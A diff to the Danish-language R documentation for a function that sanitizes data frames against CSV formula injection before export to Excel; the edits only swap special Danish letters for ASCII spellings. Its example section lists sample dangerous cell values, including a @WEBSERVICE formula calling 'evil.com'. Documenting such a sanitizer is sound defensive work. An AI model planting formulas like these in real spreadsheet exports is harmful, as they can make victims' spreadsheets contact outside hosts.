@@ -10,12 +10,12 @@ sanitize_csv_output(data)
 \item{data}{Data frame at sanitize for export}
 }
 \value{
-Data frame med sanitized værdier
+Data frame med sanitized vaerdier
 }
 \description{
 Sikrer at data eksporteret til CSV/Excel ikke kan eksekvere formler.
 Forhindrer CSV injection attacks hvor formler som =SUM() eller @WEBSERVICE()
-kan eksekveres når filen åbnes i Excel.
+kan eksekveres naar filen aabnes i Excel.
 }
 \details{
 Karakterer der kan starte en formel i Excel:
@@ -34,11 +34,11 @@ Karakterer der kan starte en formel i Excel:
 \item \\r (carriage return - kan bruges til command injection)
 }
 
-Løsning: Prefix med single quote (') for at tvinge text mode.
+Loesning: Prefix med single quote (') for at tvinge text mode.
 }
 \examples{
 \dontrun{
-# Eksempel med farlige værdier
+# Eksempel med farlige vaerdier
 data <- data.frame(
   normal = c("test", "data"),
   dangerous = c("=SUM(A1:A10)", "@WEBSERVICE('evil.com')")
